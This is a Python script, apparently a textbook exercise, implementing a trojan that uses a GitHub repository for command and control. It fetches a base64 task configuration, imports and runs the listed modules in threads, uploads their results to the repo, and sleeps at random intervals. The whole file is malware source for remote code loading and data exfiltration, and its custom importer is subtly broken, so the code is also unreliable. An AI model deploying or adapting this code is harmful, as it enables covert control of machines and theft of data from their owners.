#!/usr/bin/env python3
import json
import base64
import sys
import time
import importlib
import random
import threading
import queue
import os

from github import Github

verbose = True

najort_id = 'tset_najort'
najort_config = 'Ch{}.json'.format(najort_id)
data_path = 'data/{}/'.format(najort_id)

najort_mods = []
configured = False
task_queue = queue.Queue()


def vprint(verbose_string, lverbose=False):
    global verbose
    if lverbose or verbose:
        if lverbose:
            icon = lverbose
        else:
            icon = '*'
        print('[{}] {}'.format(icon, verbose_string), flush=True)



def connect_to_github():
    hg = None
    with open('access_token.txt', 'r') as token_file:
        access_token = token_file.readlines()[0]
        vprint(len(access_token))
        if len(access_token) == 40:
            hg = Github(access_token)
        else:
            exit(0)
    repo = hg.get_repo('chrisarm/BHP')
    branch = repo.get_branch(branch='master')
    vprint(repo)
    vprint(branch)
    return hg, repo, branch


def get_file_contents(file_path):
    hg, repo, branch = connect_to_github()
    try:
        file_contents = repo.get_contents(file_path).content
    except Exception as eg:
        file_contents = None

    return file_contents

def get_najort_config():
    global najort_config
    global configured
    config_json = get_file_contents(najort_config)
    config = json.loads(base64.b64decode(config_json))
    configured = True

    for task in config:
        if task['module'] not in sys.modules:
            exec('import {}'.format(task['module']))

    return config


def store_module_result(data):
    hg, repo, branch = connect_to_github()
    remote_path = 'Ch 7 - GitHub/data/{}/{}.dat'.format(
        najort_id,
        random.randint(1000, 10000))
    repo.create_file(remote_path, 'Mods Results', base64.b64encode(data))
    return


def module_runner(module):
    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()

    store_module_result(result)
    return


class GitImporter(object):
    def __init__(self):
        self.current_module_code = ''

    def find_module(self, mod_name, path=None):
        if configured:
            vprint('Attempting to retrieve {}'.format(mod_name))
            new_library = get_file_contents('modules/{}'.format(mod_name))

            if not new_library:
                self.current_module_code = base64.b64decode(new_library)
                return self
        return None

    def load_module(self, name):
        module = importlib.import_module(name)
        return module

sys.meta_path = [GitImporter()]

while True:
    if task_queue.empty():
        config = get_najort_config()
        for task in config:
            t = threading.Thread(target=module_runner, args=(task['module'],))
            t.start()
            time.sleep(random.randint(1,10))

    time.sleep(random.randint(1000, 10000))